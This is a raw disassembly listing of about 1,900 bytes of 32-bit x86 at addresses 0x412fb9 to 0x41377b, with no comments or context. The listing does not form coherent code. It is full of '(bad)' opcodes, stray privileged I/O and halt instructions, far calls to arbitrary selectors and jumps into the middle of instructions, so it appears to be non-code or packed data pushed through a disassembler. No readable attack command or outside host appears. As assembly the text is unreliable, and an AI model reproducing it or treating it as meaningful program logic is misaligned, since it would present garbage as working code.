  412fb9:	ror    BYTE PTR [edx-0x528ee9c7],0x54
  412fc0:	ja     0x412f5b
  412fc2:	leave  
  412fc3:	xchg   esp,eax
  412fc4:	sahf   
  412fc5:	dec    ecx
  412fc6:	jbe    0x412fc2
  412fc8:	xchg   DWORD PTR [ecx-0x56bccd14],eax
  412fce:	jge    0x412f65
  412fd0:	push   es
  412fd1:	arpl   dx,ax
  412fd3:	push   0xffffffe9
  412fd5:	lea    eax,[eax+0x6]
  412fd8:	mov    esi,edx
  412fda:	add    al,0xa7
  412fdc:	std    
  412fdd:	loopne 0x412fda
  412fdf:	jnp    0x412fc6
  412fe1:	xchg   edx,eax
  412fe2:	test   al,0x28
  412fe4:	mov    al,ds:0x58ec16ca
  412fe9:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  412feb:	not    cx
  412fee:	sub    BYTE PTR [ebx+0x4777f8b2],dh
  412ff4:	test   ebx,ecx
  412ff6:	push   ds
  412ff7:	jl     0x412f87
  412ff9:	loope  0x412f9b
  412ffb:	and    dh,BYTE PTR [edx]
  412ffd:	sub    eax,0xc9b296dd
  413002:	les    eax,FWORD PTR [eax+0x17bac3f8]
  413008:	hlt    
  413009:	adc    BYTE PTR [edi+0x33],ch
  41300c:	jo     0x412fd6
  41300e:	mov    BYTE PTR [edi+0xc],bh
  413011:	sub    eax,0x55db9614
  413016:	xor    dl,0x79
  413019:	test   BYTE PTR [ecx],cl
  41301b:	mov    dl,0x48
  41301d:	clc    
  41301e:	gs (bad) 
  413020:	aad    0xe0
  413022:	ins    BYTE PTR es:[edi],dx
  413023:	neg    DWORD PTR [edi]
  413025:	push   ebp
  413026:	les    edx,FWORD PTR [ecx+0x25]
  413029:	stc    
  41302a:	outs   dx,DWORD PTR ds:[esi]
  41302b:	add    BYTE PTR [ebp+0x6fe34d13],bh
  413031:	test   eax,0xe5fedd48
  413036:	test   al,0x72
  413038:	stos   BYTE PTR es:[edi],al
  413039:	retf   0x55f6
  41303c:	outs   dx,DWORD PTR ds:[esi]
  41303d:	jae    0x41302a
  41303f:	loope  0x412ffc
  413041:	mov    ah,0x50
  413043:	xor    bl,0xe0
  413046:	mov    ?,WORD PTR gs:[ebx-0x725c759a]
  41304d:	pop    edi
  41304e:	iret   
  41304f:	cdq    
  413050:	pop    ds
  413051:	add    edx,ecx
  413053:	pop    edi
  413054:	test   BYTE PTR [eax-0x742704fe],ah
  41305a:	out    0xc4,al
  41305c:	inc    ebp
  41305d:	ja     0x413099
  41305f:	and    al,0xf7
  413061:	mov    dl,0xa1
  413063:	shl    DWORD PTR [ecx+0x6594d18a],1
  413069:	(bad)  
  41306a:	xor    eax,0xad52e883
  41306f:	stos   BYTE PTR es:[edi],al
  413070:	xlat   BYTE PTR ds:[ebx]
  413071:	add    ebx,ebx
  413073:	mov    ch,0x38
  413075:	mov    ebp,0x14a751c2
  41307a:	cmp    ebp,DWORD PTR [esi]
  41307c:	adc    ecx,DWORD PTR [ebx]
  41307e:	fmul   st,st(5)
  413080:	and    eax,0x911813a6
  413085:	clc    
  413086:	pop    ecx
  413088:	jle    0x41304e
  41308a:	mov    ss,WORD PTR [eax+0x0]
  41308d:	jmp    0x41301d
  41308f:	cmp    eax,0x76204bb7
  413094:	inc    ebp
  413095:	mov    cs,WORD PTR [ecx+0x2]
  413098:	lahf   
  413099:	hlt    
  41309a:	ror    BYTE PTR [edx-0x67],cl
  41309d:	dec    ebp
  41309e:	fs enter 0xa6cc,0x54
  4130a3:	jecxz  0x4130f4
  4130a5:	mov    ds:0x6555db18,al
  4130aa:	rol    DWORD PTR [edx],0x78
  4130ad:	lock pushf 
  4130af:	sub    dh,ah
  4130b1:	imul   edi,DWORD PTR [ecx+esi*1+0x11cb16f2],0x1314a88f
  4130bc:	cmp    bl,0x9b
  4130bf:	leave  
  4130c0:	inc    ebp
  4130c1:	pop    ebp
  4130c2:	and    DWORD PTR [ecx+0x18f6bc85],0xffffff98
  4130c9:	ret    0x7378
  4130cc:	mov    edx,0x434bab3c
  4130d1:	sub    dh,cl
  4130d3:	shl    DWORD PTR [ebx-0x9],cl
  4130d6:	(bad)  
  4130d7:	pusha  
  4130d8:	pop    ss
  4130d9:	adc    ebx,DWORD PTR [ebx]
  4130db:	ret    
  4130dc:	push   esp
  4130dd:	daa    
  4130de:	fwait
  4130df:	mov    bh,BYTE PTR [esi+edi*8+0x8]
  4130e3:	js     0x413161
  4130e5:	repnz xchg ebp,eax
  4130e7:	ret    0xdee8
  4130ea:	mov    al,0xa3
  4130ec:	rcr    BYTE PTR [edi-0xf],cl
  4130ef:	push   ebx
  4130f0:	sub    al,0xcc
  4130f2:	mov    cl,0xb3
  4130f4:	jmp    DWORD PTR [edi]
  4130f6:	pusha  
  4130f7:	fbld   TBYTE PTR [ebx+edi*8+0x70]
  4130fb:	inc    edx
  4130fc:	or     eax,0x911bba85
  413101:	push   esp
  413102:	inc    edi
  413103:	xlat   BYTE PTR ds:[ebx]
  413104:	into   
  413105:	mov    al,ds:0xaffd03be
  41310a:	les    edi,FWORD PTR [esp+edi*2-0x4ea40a8c]
  413111:	jnp    0x413178
  413113:	jg     0x4130d8
  413115:	mov    esp,0xb9a2f744
  41311a:	into   
  41311b:	xor    eax,ecx
  41311d:	push   ds
  41311e:	(bad)  
  41311f:	loopne 0x413169
  413121:	cmc    
  413122:	inc    esp
  413123:	imul   DWORD PTR [edi-0x59cd5c19]
  413129:	inc    esi
  41312a:	popa   
  41312b:	stc    
  41312c:	ins    DWORD PTR es:[edi],dx
  41312d:	ja     0x413101
  41312f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413130:	pop    edi
  413131:	idiv   DWORD PTR [edx+0x33]
  413134:	jmp    0x4131b3
  413136:	cli    
  413137:	xchg   esp,eax
  413138:	mov    eax,ds:0x339b1a21
  41313d:	les    edi,FWORD PTR [ebp-0x722631ec]
  413143:	dec    ecx
  413144:	jmp    0x4131a7
  413146:	cdq    
  413147:	div    BYTE PTR [ebx+0x425a2ce]
  41314d:	jg     0x413100
  41314f:	addr16 push ss
  413151:	xor    DWORD PTR [eax+0x1cdcc6f2],edi
  413157:	xchg   ch,bh
  413159:	jbe    0x4131da
  41315b:	inc    edi
  41315c:	ds call 0x24bd56bf
  413162:	iret   
  413163:	pop    ss
  413164:	mov    ds:0x512a6fb9,al
  413169:	xchg   edx,eax
  41316a:	cdq    
  41316b:	cmp    cl,BYTE PTR [ecx+0x9]
  41316e:	inc    ebx
  41316f:	ror    DWORD PTR [ebp-0x43acbcc1],cl
  413175:	scas   eax,DWORD PTR es:[edi]
  413176:	pop    es
  413177:	mov    al,ds:0x2fc62642
  41317c:	adc    DWORD PTR [esp+ecx*4],edx
  41317f:	scas   eax,DWORD PTR es:[edi]
  413180:	xchg   ebp,eax
  413181:	scas   eax,DWORD PTR es:[edi]
  413182:	adc    BYTE PTR [edi-0xf],cl
  413185:	sub    eax,0xa4dbc3b1
  41318a:	jns    0x413184
  41318c:	xchg   BYTE PTR [esi+0x2b9d8b20],ch
  413192:	in     al,dx
  413193:	cmp    eax,0x7a86caec
  413198:	stc    
  413199:	mov    ds:0x710d15e5,eax
  41319e:	aas    
  41319f:	jno    0x413177
  4131a1:	lea    ebx,[ecx]
  4131a3:	lock lods al,BYTE PTR ds:[esi]
  4131a6:	jae    0x413134
  4131a8:	sub    al,0x15
  4131aa:	mov    ss,WORD PTR [eax+0x2e]
  4131ad:	dec    edi
  4131ae:	push   0x1eee4e59
  4131b3:	xchg   BYTE PTR [edi-0x4f],ah
  4131b6:	frstor [eax+0x5ab50632]
  4131bc:	sbb    al,0x81
  4131be:	inc    ecx
  4131bf:	xchg   ebx,eax
  4131c0:	ret    
  4131c1:	and    eax,0x2bba18b2
  4131c6:	mov    ds:0x5bd74981,al
  4131cb:	iret   
  4131cc:	sub    dh,BYTE PTR [edi+0xaf41407]
  4131d2:	bswap  edx
  4131d4:	dec    edx
  4131d5:	pop    ds
  4131d6:	ins    BYTE PTR es:[edi],dx
  4131d7:	mov    dl,dh
  4131d9:	adc    BYTE PTR [ecx-0x1261eaa5],dh
  4131df:	(bad)  [edx]
  4131e1:	mov    eax,ds:0x7104c25d
  4131e6:	aad    0xde
  4131e8:	rcl    DWORD PTR [eax+ecx*2+0x69266b39],cl
  4131ef:	pop    ebx
  4131f0:	iret   
  4131f1:	xor    BYTE PTR [edi+0x36],dl
  4131f4:	add    al,0xc6
  4131f6:	mov    ecx,DWORD PTR [ecx+0x6dfc74e5]
  4131fc:	dec    edi
  4131fd:	sub    DWORD PTR [edx-0x764218be],edi
  413203:	loope  0x4131c2
  413205:	test   eax,0x5188297a
  41320a:	xlat   BYTE PTR ds:[ebx]
  41320b:	inc    edx
  41320c:	jg     0x413206
  41320e:	mov    edx,0x3350ae9
  413213:	mov    bl,0x25
  413215:	addr16 hlt 
  413217:	int    0xd2
  413219:	dec    eax
  41321a:	retf   0xc586
  41321d:	fbld   TBYTE PTR [edx]
  41321f:	cdq    
  413220:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413221:	sub    BYTE PTR [edi-0x2],ah
  413224:	aam    0x92
  413226:	push   cs
  413227:	or     ecx,ebx
  413229:	cmp    ecx,0x3b
  41322c:	mov    DWORD PTR [edi+edi*4-0x64b3630],edi
  413233:	arpl   WORD PTR [ecx-0x4b],di
  413236:	jle    0x4131ec
  413238:	jle    0x413256
  41323a:	inc    ecx
  41323b:	dec    esi
  41323c:	ret    0x651b
  41323f:	rcl    ebp,0xf2
  413242:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413243:	shl    BYTE PTR [edi+0x3c],cl
  413246:	dec    ebx
  413247:	xchg   ebx,eax
  413248:	or     al,BYTE PTR [ebx+0xcce00cf]
  41324e:	pusha  
  41324f:	(bad)  
  413250:	pop    ss
  413251:	jg     0x413247
  413253:	add    ecx,DWORD PTR [esi-0xc]
  413256:	pushf  
  413257:	and    dl,BYTE PTR [ebx+edx*2-0x37]
  41325b:	sahf   
  41325c:	or     BYTE PTR [eax+edx*2+0x6b],0xf2
  413261:	enter  0x8a0f,0x76
  413265:	pop    ecx
  413266:	push   ecx
  413267:	cmp    ah,BYTE PTR [eax+0x44]
  41326a:	lahf   
  41326b:	adc    dl,ah
  41326d:	jecxz  0x4132a6
  41326f:	mov    bh,0x22
  413271:	mov    dl,0xe3
  413273:	repz (bad) 
  413275:	cmp    cl,ah
  413277:	mov    ?,WORD PTR [eax]
  413279:	mov    edx,0x27ca1911
  41327e:	(bad)  
  41327f:	fld    DWORD PTR [ebx-0x6d500970]
  413285:	mov    ecx,0x4e5bfac4
  41328a:	push   eax
  41328b:	adc    ah,BYTE PTR [ebp+0x68]
  41328e:	sbb    DWORD PTR [edi+0x23d70cd7],esp
  413294:	and    al,0xba
  413296:	adc    eax,0x30803557
  41329b:	pop    ss
  41329c:	push   esp
  41329d:	(bad)  
  41329e:	cld    
  41329f:	xchg   esp,eax
  4132a0:	sbb    DWORD PTR [ecx+edi*8+0x1a],0xec0e58a8
  4132a8:	or     dh,BYTE PTR cs:[edx]
  4132ab:	pop    edx
  4132ac:	(bad)  
  4132ad:	jle    0x413280
  4132af:	add    esi,ebp
  4132b1:	mov    bh,0xc
  4132b3:	lods   eax,DWORD PTR ds:[esi]
  4132b4:	dec    ecx
  4132b5:	into   
  4132b6:	aaa    
  4132b7:	dec    eax
  4132b8:	cld    
  4132b9:	ja     0x41324d
  4132bb:	jge    0x4132f6
  4132bd:	enter  0x887d,0x9c
  4132c1:	adc    al,0xba
  4132c3:	in     eax,dx
  4132c4:	pop    ecx
  4132c5:	push   ds
  4132c6:	leave  
  4132c7:	mov    cl,0xff
  4132c9:	aas    
  4132ca:	repnz rol DWORD PTR [ecx-0x4e],1
  4132ce:	adc    eax,ebx
  4132d0:	inc    eax
  4132d1:	not    BYTE PTR [ecx+0x32]
  4132d4:	sub    eax,0xd4be6675
  4132d9:	pop    ecx
  4132da:	cmp    bh,BYTE PTR [edi]
  4132dc:	xor    DWORD PTR ds:0xf5f270b7,eax
  4132e2:	rol    bl,0xc4
  4132e5:	push   ebp
  4132e7:	cdq    
  4132e8:	ja     0x4132e2
  4132ea:	call   0x7823:0x1f267072
  4132f1:	arpl   WORD PTR [ecx+eiz*8+0x13444ad0],dx
  4132f8:	addr16 mov ebx,0xa5f30c3
  4132fe:	test   BYTE PTR [ecx],dl
  413300:	inc    esi
  413301:	jne    0x4132a6
  413303:	gs pop esi
  413305:	out    dx,eax
  413306:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413307:	sub    bl,BYTE PTR [esi]
  413309:	call   0x8e8c:0xc25ade93
  413310:	xchg   DWORD PTR [eax-0x542133d9],edx
  413316:	fadd   QWORD PTR [edx-0x76]
  413319:	pop    DWORD PTR [eax+0x2]
  41331c:	pop    ecx
  41331d:	repz dec esi
  41331f:	pop    ebx
  413320:	gs jg  0x41332c
  413323:	pusha  
  413324:	dec    edi
  413325:	mov    bh,0x1d
  413327:	xchg   edx,eax
  413328:	jb     0x4132b0
  41332a:	stc    
  41332b:	or     ah,BYTE PTR [eax]
  41332d:	ret    
  41332e:	xchg   edx,eax
  41332f:	out    dx,eax
  413330:	add    edx,ebx
  413332:	lea    ecx,[eax]
  413334:	dec    esp
  413335:	stos   BYTE PTR es:[edi],al
  413336:	fwait
  413337:	aam    0x31
  413339:	imul   edi,DWORD PTR [ecx+0xb],0xf071638
  413340:	repnz mov dh,0x1e
  413343:	rcr    DWORD PTR [edi+0x79],0xc9
  413347:	(bad)  
  413349:	hlt    
  41334a:	mov    ebx,ss
  41334c:	cdq    
  41334d:	or     eax,0x32419c0f
  413352:	sar    edi,cl
  413354:	xchg   DWORD PTR [ebp+0x45f02f34],esi
  41335a:	loop   0x4132dc
  41335c:	mov    esp,0x20103829
  413361:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413362:	out    dx,al
  413363:	lods   eax,DWORD PTR ds:[esi]
  413364:	repz jle 0x4133c6
  413367:	test   BYTE PTR [ebx-0x72],ah
  41336a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41336b:	or     DWORD PTR [edx],esi
  41336d:	adc    DWORD PTR [ecx],0x1589bf4e
  413373:	test   cl,bh
  413375:	jbe    0x413350
  413377:	stos   DWORD PTR es:[edi],eax
  413378:	inc    eax
  413379:	inc    ebx
  41337a:	ins    BYTE PTR es:[edi],dx
  41337b:	ret    
  41337c:	jne    0x413332
  41337e:	and    edi,ebp
  413380:	std    
  413381:	mov    al,ds:0xfc3207c3
  413386:	jge    0x41332e
  413388:	mov    BYTE PTR [ecx],cl
  41338a:	sar    esp,cl
  41338c:	fidivr WORD PTR ds:0x45240bce
  413392:	mov    DWORD PTR [edx+0xe53dc38],edx
  413398:	push   0x5f
  41339a:	cld    
  41339b:	stc    
  41339c:	and    BYTE PTR [eax],dl
  41339e:	pop    WORD PTR gs:[ecx-0x5c]
  4133a3:	cli    
  4133a4:	(bad)  
  4133a5:	xchg   ebp,eax
  4133a6:	out    dx,eax
  4133a7:	fs mov al,0x59
  4133aa:	push   esp
  4133ab:	lods   al,BYTE PTR ds:[esi]
  4133ac:	(bad)  
  4133ad:	mov    BYTE PTR [ebx+ecx*2-0x22c34886],dh
  4133b4:	xchg   esi,eax
  4133b5:	xlat   BYTE PTR ds:[ebx]
  4133b6:	mov    al,ds:0xe2fcfbd7
  4133bb:	pop    ss
  4133bc:	rcl    esi,cl
  4133be:	sbb    al,0x57
  4133c0:	in     al,0x82
  4133c2:	fdiv   QWORD PTR [eax-0x5d590436]
  4133c8:	outs   dx,BYTE PTR ds:[esi]
  4133c9:	xor    eax,0xa48f21ae
  4133ce:	test   eax,0x91bcfa63
  4133d3:	inc    esi
  4133d4:	push   0xf6341d07
  4133d9:	mov    ds:0x13c2e51f,eax
  4133de:	retf   
  4133df:	mov    BYTE PTR [edx+0x66],bl
  4133e2:	push   0xffffff8c
  4133e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133e5:	adc    edx,DWORD PTR [ebx+0x29]
  4133e8:	cmp    al,0x27
  4133ea:	jb     0x41342b
  4133ec:	sbb    DWORD PTR [eax-0x1d],eax
  4133ef:	inc    esp
  4133f0:	sub    al,0x62
  4133f2:	rcl    ah,cl
  4133f4:	pop    eax
  4133f5:	jge    0x4133c3
  4133f7:	xchg   edx,eax
  4133f8:	shr    DWORD PTR [ecx+0x30],1
  4133fb:	jbe    0x413441
  4133fd:	pop    eax
  4133fe:	jg     0x4133c0
  413400:	mov    al,0x49
  413402:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413403:	pop    ds
  413404:	ins    DWORD PTR es:[edi],dx
  413405:	and    DWORD PTR [ecx+ebx*4],0xfffffff1
  413409:	mov    esi,0x686150c9
  41340e:	fnsave [edx]
  413410:	in     eax,0x42
  413412:	dec    edi
  413413:	out    0xd1,al
  413415:	call   0xed1887ce
  41341a:	jno    0x4133aa
  41341c:	xor    al,0x3c
  41341e:	pop    esi
  41341f:	push   es
  413420:	jp     0x4133fe
  413422:	sbb    bl,BYTE PTR [ebx]
  413424:	jl     0x413419
  413426:	mov    WORD PTR [eax+0x56dbefb2],es
  41342c:	mul    esi
  41342e:	xchg   esp,eax
  41342f:	pop    esp
  413430:	sbb    eax,0x77b2ffae
  413435:	das    
  413436:	retf   0x1ab0
  413439:	scas   eax,DWORD PTR es:[edi]
  41343a:	cmp    DWORD PTR ds:0x9fcf024f,esi
  413440:	xchg   ebp,eax
  413441:	or     DWORD PTR ds:0xeb49de56,esp
  413447:	add    BYTE PTR [edi-0x5c],cl
  41344a:	push   ecx
  41344b:	std    
  41344c:	int3   
  41344d:	stos   BYTE PTR es:[edi],al
  41344e:	stos   BYTE PTR es:[edi],al
  41344f:	iret   
  413450:	ret    0xa924
  413453:	not    BYTE PTR [eax+ebp*4-0x42]
  413457:	nop
  413458:	(bad)  
  41345a:	enter  0xde22,0x55
  41345e:	enter  0x2356,0x90
  413462:	jecxz  0x41345f
  413464:	arpl   WORD PTR [eax+ebp*1],bp
  413467:	je     0x413466
  413469:	ficomp WORD PTR [ebx-0x4fc91d6e]
  41346f:	lock pop ebx
  413471:	mov    WORD PTR [edx+0x7a],fs
  413474:	sahf   
  413475:	mov    cl,0x6
  413477:	xor    eax,DWORD PTR [esi+eax*8-0x36]
  41347b:	adc    ebp,ebp
  41347d:	test   DWORD PTR [ebx],edx
  41347f:	ret    0xce89
  413482:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413483:	and    al,0xa4
  413485:	sahf   
  413486:	mov    eax,ds:0x3b786bad
  41348b:	leave  
  41348c:	mov    edx,DWORD PTR [eax+0x4a06f0e5]
  413492:	cwde   
  413493:	pop    DWORD PTR [edx]
  413495:	dec    esp
  413496:	int3   
  413497:	stc    
  413498:	xor    ebp,esp
  41349a:	and    dl,BYTE PTR [ebx]
  41349c:	sbb    al,BYTE PTR [esi-0x395ab877]
  4134a2:	data16 (bad) 
  4134a4:	push   esp
  4134a5:	enter  0xa23f,0x73
  4134a9:	lods   eax,DWORD PTR ds:[esi]
  4134aa:	xor    al,0x4c
  4134ac:	dec    esi
  4134ad:	sub    al,dl
  4134af:	stos   DWORD PTR es:[edi],eax
  4134b0:	rcl    BYTE PTR [edi-0x2f],0xb7
  4134b4:	push   es
  4134b5:	(bad)  
  4134b6:	cld    
  4134b7:	dec    edx
  4134b8:	clc    
  4134b9:	mov    BYTE PTR [ebx+0x51],bl
  4134bc:	cdq    
  4134bd:	icebp  
  4134be:	pop    ecx
  4134bf:	out    dx,al
  4134c0:	lds    ebp,FWORD PTR [esi]
  4134c2:	dec    ebp
  4134c3:	enter  0x59c8,0xc1
  4134c7:	cmp    ah,BYTE PTR [esp+edx*4+0x4fd0f431]
  4134ce:	test   BYTE PTR [esi+0x2b],0xa6
  4134d2:	add    ch,dh
  4134d4:	jno    0x41348d
  4134d6:	jae    0x413513
  4134d8:	jae    0x413480
  4134da:	imul   edi,DWORD PTR [esi+0x63de710c],0x8f963bac
  4134e4:	adc    eax,0x66a7f997
  4134e9:	push   edx
  4134ea:	test   BYTE PTR [esi-0x27a4012],dl
  4134f0:	adc    al,0xa9
  4134f2:	jmp    0x41355a
  4134f4:	stos   DWORD PTR es:[edi],eax
  4134f5:	mov    cl,0xda
  4134f7:	addr16 sti 
  4134f9:	jne    0x4134eb
  4134fb:	dec    ecx
  4134fc:	or     bh,BYTE PTR [eax-0x6b8a8a56]
  413502:	and    ebp,ebp
  413504:	jp     0x41356c
  413506:	mov    edi,0x1f2aa7dc
  41350b:	into   
  41350c:	xlat   BYTE PTR ds:[ebx]
  41350d:	test   eax,0x5672ec2e
  413512:	adc    ecx,DWORD PTR [eax+0x24a8f9fa]
  413518:	gs ja  0x4134bc
  41351b:	jae    0x4134cc
  41351d:	adc    eax,0x98224877
  413522:	add    BYTE PTR [edi-0x21],dh
  413525:	pop    edx
  413526:	mov    cl,0x47
  413528:	sar    BYTE PTR [ebx+0x4b],cl
  41352b:	mov    esp,0x5d7da7f3
  413530:	(bad)  [edi]
  413532:	dec    edx
  413533:	sub    edx,DWORD PTR [ebp+0x7a]
  413536:	pushf  
  413537:	jl     0x413506
  413539:	fucom  st(5)
  41353b:	rcr    bl,cl
  41353d:	rcl    BYTE PTR [edi+0x46],0x1a
  413541:	sub    BYTE PTR [ecx-0x7f074f80],ah
  413547:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413548:	xchg   esi,eax
  413549:	mov    ch,0x44
  41354b:	sahf   
  41354c:	add    al,0x7e
  41354e:	out    dx,al
  41354f:	jae    0x41359d
  413551:	out    0x76,al
  413553:	jo     0x4135b0
  413555:	inc    ecx
  413556:	shl    DWORD PTR ds:0xd66985cb,cl
  41355c:	and    BYTE PTR [edx-0x6e],0x7c
  413560:	jp     0x413531
  413562:	xchg   edi,eax
  413563:	(bad)  
  413564:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413565:	loope  0x4135ce
  413567:	or     DWORD PTR [edx+ebx*8],ecx
  41356a:	mov    esi,0xd8ebbe8c
  41356f:	push   edi
  413570:	ins    BYTE PTR es:[edi],dx
  413571:	or     BYTE PTR [edx-0x2fecf1d8],al
  413577:	sub    al,0x36
  413579:	adc    esp,DWORD PTR [edx-0xe6d91a0]
  41357f:	xchg   ebx,eax
  413580:	push   es
  413581:	das    
  413582:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413583:	cld    
  413584:	cmp    al,0x2c
  413586:	mov    WORD PTR [edi-0x50],es
  413589:	outs   dx,BYTE PTR ds:[esi]
  41358a:	arpl   WORD PTR ds:0xbb9fb4b,bx
  413590:	cwde   
  413591:	mov    edx,0x42346158
  413596:	das    
  413597:	gs jo  0x413527
  41359a:	aaa    
  41359b:	hlt    
  41359c:	sub    eax,0x38a25b6b
  4135a1:	dec    edi
  4135a2:	jnp    0x4135dc
  4135a4:	pop    edi
  4135a5:	clc    
  4135a6:	sbb    cl,BYTE PTR [ecx-0x2533f5fa]
  4135ac:	mov    esp,0x2d4667e2
  4135b1:	daa    
  4135b2:	dec    ebp
  4135b3:	sbb    dl,BYTE PTR [ecx-0x4560eb4b]
  4135b9:	jns    0x4135ae
  4135bb:	nop
  4135bc:	out    dx,eax
  4135bd:	jno    0x41361e
  4135bf:	adc    DWORD PTR [edx],ebp
  4135c1:	aas    
  4135c2:	xchg   DWORD PTR [ecx-0x52],ecx
  4135c5:	inc    ebp
  4135c6:	mov    edx,0x2a896462
  4135cb:	jns    0x41359f
  4135cd:	repnz enter 0x3e53,0xed
  4135d2:	and    bl,BYTE PTR ds:0x6949a53a
  4135d8:	xchg   esp,eax
  4135d9:	inc    edi
  4135da:	and    bh,BYTE PTR [esi-0x672fe9a1]
  4135e0:	sub    ah,BYTE PTR ds:0xcbee4817
  4135e6:	cmp    ah,BYTE PTR [eax+edi*8]
  4135e9:	or     BYTE PTR [ebx],bh
  4135eb:	int    0xaa
  4135ed:	cwde   
  4135ee:	pop    esp
  4135ef:	push   edi
  4135f0:	fadd   st(0),st
  4135f2:	stc    
  4135f3:	xchg   esp,eax
  4135f4:	or     ebx,DWORD PTR [ecx-0x5ccd3d77]
  4135fa:	dec    ecx
  4135fb:	xor    edi,DWORD PTR [ebp-0x4c]
  4135fe:	repz arpl WORD PTR [edi+0x1ca748ee],ax
  413605:	push   ecx
  413606:	cdq    
  413607:	loop   0x413615
  413609:	daa    
  41360a:	sub    DWORD PTR [edx+0x46],edx
  41360d:	sub    BYTE PTR [edx],ah
  41360f:	pushf  
  413610:	loop   0x4135af
  413612:	inc    ecx
  413613:	and    BYTE PTR [esi+0x39b8f15f],0xf5
  41361a:	sbb    ecx,DWORD PTR [ecx-0xee2a96e]
  413620:	in     al,0xd8
  413622:	add    DWORD PTR [ecx-0x6cbc6fe7],esp
  413628:	push   edx
  413629:	fwait
  41362a:	add    bh,cl
  41362c:	dec    eax
  41362d:	pop    esp
  41362e:	cli    
  41362f:	or     BYTE PTR [eax-0x1bbaf060],0xbf
  413636:	mov    cl,0x71
  413638:	inc    edi
  413639:	pop    eax
  41363a:	test   al,0x77
  41363c:	ret    0xab60
  41363f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413640:	popf   
  413641:	adc    BYTE PTR [eax],cl
  413643:	jb     0x41365c
  413645:	cs in  eax,0xfb
  413648:	data16 sbb bh,BYTE PTR [ecx]
  41364b:	fiadd  WORD PTR [ebp-0x6a]
  41364e:	inc    eax
  41364f:	mov    ecx,0xe0b6c7be
  413654:	loope  0x413686
  413656:	ret    0x65d0
  413659:	jecxz  0x4135f9
  41365b:	fmulp  st(0),st
  41365d:	in     eax,0x54
  41365f:	ds jge 0x413647
  413662:	shl    BYTE PTR [esi+0x62cf4b9c],cl
  413668:	gs cmp al,0xc1
  41366b:	and    DWORD PTR [ecx-0x34b5e888],edi
  413671:	inc    ecx
  413672:	mov    ebx,0xec02e563
  413677:	pop    DWORD PTR [esi+0x3c]
  41367a:	adc    DWORD PTR [ebx],eax
  41367c:	inc    eax
  41367d:	jns    0x413696
  41367f:	push   0xa31dcead
  413684:	xchg   esp,eax
  413685:	xor    al,0xf5
  413687:	popa   
  413688:	add    al,0x30
  41368a:	test   al,0xe3
  41368c:	ss in  al,0x8d
  41368f:	data16 loopne 0x413622
  413692:	jmp    FWORD PTR ds:0xef792e7
  413698:	out    dx,al
  413699:	sbb    edx,DWORD PTR [ebp+0x227af671]
  41369f:	and    al,0xf7
  4136a1:	xor    esp,DWORD PTR ds:0x277dad4a
  4136a7:	ins    DWORD PTR es:[edi],dx
  4136a8:	jmp    0x413657
  4136aa:	mov    ebp,0x10b4f8f2
  4136af:	xor    eax,0x1634d66
  4136b4:	ja     0x413676
  4136b6:	mov    ss,WORD PTR [ebx]
  4136b8:	leave  
  4136b9:	adc    ebx,edi
  4136bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136bc:	data16 (bad) 
  4136bf:	pop    di
  4136c1:	mov    eax,DWORD PTR [ecx+edx*1]
  4136c4:	fistp  DWORD PTR ds:0x54b4884
  4136ca:	sub    BYTE PTR [eax+0x4f],bh
  4136cd:	cmp    ah,ch
  4136cf:	mov    ebx,0x7cceff4b
  4136d4:	pop    ss
  4136d5:	or     al,0x74
  4136d7:	push   esi
  4136d8:	pop    esi
  4136d9:	or     bl,BYTE PTR [eax+0x9]
  4136dc:	pop    esp
  4136dd:	call   0x67db:0xcebf14e0
  4136e4:	iret   
  4136e5:	xor    cl,BYTE PTR [edi+0x3c]
  4136e8:	cmp    al,0x93
  4136ea:	clc    
  4136eb:	(bad)  
  4136ed:	shr    ch,0xe9
  4136f0:	popf   
  4136f1:	adc    esp,eax
  4136f3:	cmp    al,BYTE PTR [edx+esi*4-0x4f1f91c0]
  4136fa:	clc    
  4136fb:	sub    ecx,DWORD PTR [ecx-0x11d528df]
  413701:	repnz pusha 
  413703:	jae    0x41370f
  413705:	and    eax,0xd5a05fa7
  41370a:	mov    esi,0xd0c82816
  41370f:	add    esi,DWORD PTR [eax-0x6f]
  413712:	mov    edi,ebp
  413714:	push   eax
  413715:	in     eax,0x4f
  413717:	in     eax,0xda
  413719:	nop
  41371a:	or     DWORD PTR [edx],edi
  41371c:	push   ds
  41371d:	scas   al,BYTE PTR es:[edi]
  41371e:	push   es
  41371f:	mov    ch,0xd9
  413721:	iret   
  413722:	mov    al,0xc7
  413724:	push   0xffffffcd
  413726:	js     0x4136d7
  413728:	neg    DWORD PTR [ebx-0x50]
  41372b:	lahf   
  41372c:	inc    esp
  41372d:	push   0x590a06d1
  413732:	inc    ebx
  413733:	xchg   ebx,eax
  413734:	cmp    edi,eax
  413736:	nop
  413737:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413738:	mov    edi,0xbddff97d
  41373d:	pop    ds
  41373e:	push   edi
  41373f:	or     eax,0x67d9efa0
  413744:	add    ch,al
  413746:	(bad)  
  413747:	xchg   esi,eax
  413748:	push   edi
  413749:	jns    0x4137bf
  41374b:	ins    DWORD PTR es:[edi],dx
  41374c:	xchg   BYTE PTR [edx-0x4f],ah
  41374f:	xchg   BYTE PTR [ecx+0x23665059],cl
  413755:	and    DWORD PTR [ecx-0x5e62b783],ecx
  41375b:	(bad)  
  41375c:	dec    edi
  41375d:	mov    ebp,0x55ec6b46
  413762:	das    
  413763:	fstp   QWORD PTR [ebx+0x7fb2df20]
  413769:	dec    ebp
  41376a:	mov    ds:0xfddaf9b6,eax
  41376f:	std    
  413770:	pop    ebx
  413771:	(bad)  
  413772:	jmp    0x413766
  413774:	and    eax,0x2a26fabd
  413779:	ss xchg ebx,eax
  41377b:	retf   0xb4c3
